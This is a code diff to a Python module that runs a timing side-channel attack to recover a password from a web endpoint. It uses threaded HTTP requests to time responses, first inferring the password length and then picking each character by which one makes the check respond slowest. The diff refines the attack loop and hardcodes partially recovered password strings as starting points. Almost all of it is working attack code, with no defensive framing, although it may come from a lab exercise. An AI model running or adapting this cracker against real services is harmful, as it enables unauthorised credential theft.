@@ -1,9 +1,9 @@
 import os
 import logging as log
 from time import time
+import time as timer
 import Configurations
 import urllib.request
-from concurrent import futures
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 
@@ -47,7 +47,7 @@ def set_logger(result_path: str, class_name: str, log_filename=None) -> log.Logg
     create_folder_if_not_exists(result_path)
     create_folder_if_not_exists(os.path.join(result_path, class_name))
 
-    log.basicConfig(filename=os.path.join(result_path, class_name, log_filename), filemode='w', level=log.INFO)
+    log.basicConfig(filename=os.path.join(result_path, class_name, log_filename), filemode='w', level=Configurations.log_level)
     logger = log.getLogger('MyLogger')
     formatter = MyFormatter(fmt='%(asctime)s %(message)s', datefmt='%Y-%m-%d,%H:%M:%S.%f')
     handler = log.StreamHandler()
@@ -129,6 +129,14 @@ def create_folder_if_not_exists(folder_path):
 
 # - - - - - - - - - -  PASSWORD SECTION  - - - - - - - - - -
 
+def run_url(url: str) -> str:
+    timer.sleep(Configurations.sleep_time)
+    ans = urllib.request.urlopen(url)
+    timer.sleep(Configurations.sleep_time)
+
+    return ans.read().decode("utf-8")
+
+
 def check_password_size_thread(url: str, iterations: int, thread_number: int, logger):
     """
 
@@ -138,22 +146,21 @@ def check_password_size_thread(url: str, iterations: int, thread_number: int, lo
     :param logger:
     :return:
     """
-    toal_itearations_time = 0
+    total_iterations_time = 0
 
     for i in range(iterations):
         # measure time
         start = time()
-        urllib.request.urlopen(url)
+        run_url(url)
         end = time()
 
         # insert to dict
-        toal_itearations_time += end - start
+        total_iterations_time += end - start
 
         if i % 100 == 0:
-            write_log(logger,
-                      f"[check_password_size_thread][thread number: {thread_number}][iteration number: {i}] result time: {toal_itearations_time}:")
+            write_log(logger, f"[check password size thread][thread {thread_number}][iter {i}] result: {total_iterations_time}:")
 
-    return toal_itearations_time
+    return total_iterations_time
 
 
 def check_password_size(start_url: str = "", end_url: str = "",
@@ -171,7 +178,7 @@ def check_password_size(start_url: str = "", end_url: str = "",
     future_results = []
 
     for i in range(0, password_size + 1, 1):
-        url = f'{start_url}{"A" * i}{end_url}'
+        url = f'{start_url}{Configurations.default_character * i}{end_url}'
         future_results.append(thread_pool.submit(check_password_size_thread, url, Configurations.attempts, i, logger))
 
     thread_pool.shutdown(wait=True)
@@ -192,12 +199,12 @@ def crack_password_thread(url, ch, iterations: int=Configurations.attempts, logg
     for i in range(iterations):
         # measure time
         start = time()
-        result = urllib.request.urlopen(url)
+        result = run_url(url)
         end = time()
 
         # insert to dict
         total_iterations_time += (end - start)
-        if result.read() == b'1':
+        if result == '1':
             raise ValueError(f"FoundPassWord! 'url'.")
         if i % 1 == 0:
             write_log(logger, f"[crack password thread][{ch}][iteration {i}] result time: {total_iterations_time}  -  {url}")
@@ -212,15 +219,17 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
     :param logger:
     :return:
     """
-    password = ""
+    password = "izxuwlxfktdn"
+    password = "izxuwlxfktdnba"
+    password = "izxuwlxfktdnb"
 
-    for i in range(password_size):
+    for i in range(password_size - len(password)):
 
         thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)
         future_results = []
 
         for ch in Configurations.characters:
-            url = f"{start_url}{password}{ch}{'-' * ((password_size - len(password) - 1))}{end_url}"
+            url = f"{start_url}{password}{ch}{Configurations.default_character * ((password_size - len(password) - 1))}{end_url}"
             future_results.append(thread_pool.submit(crack_password_thread, url, ch, Configurations.attempts, logger))
 
         thread_pool.shutdown(wait=True)
@@ -231,13 +240,13 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
             result = future_results[j].result()
             letters_dict[result[0]] = result[1]
 
-        minimum_key = min(letters_dict, key=letters_dict.get)
-        print(minimum_key, letters_dict[minimum_key])
+        maximum_key = max(letters_dict, key=letters_dict.get)
+        print(maximum_key, letters_dict[maximum_key])
 
-        password += minimum_key
-        write_log(logger, f"[crack password]: iteration {i} got that the chosen letter if: {minimum_key} (current password is '{password}).')")
+        password += maximum_key
+        write_log(logger, f"[crack password]: iteration {i} got that the chosen letter if: {maximum_key} (current password is '{password}).')")
 
-    write_log(logger, f"[crack password]: password found: '{password})'.")
+    write_log(logger, f"[crack password]: password found: {password}   .")
 
     return password
 
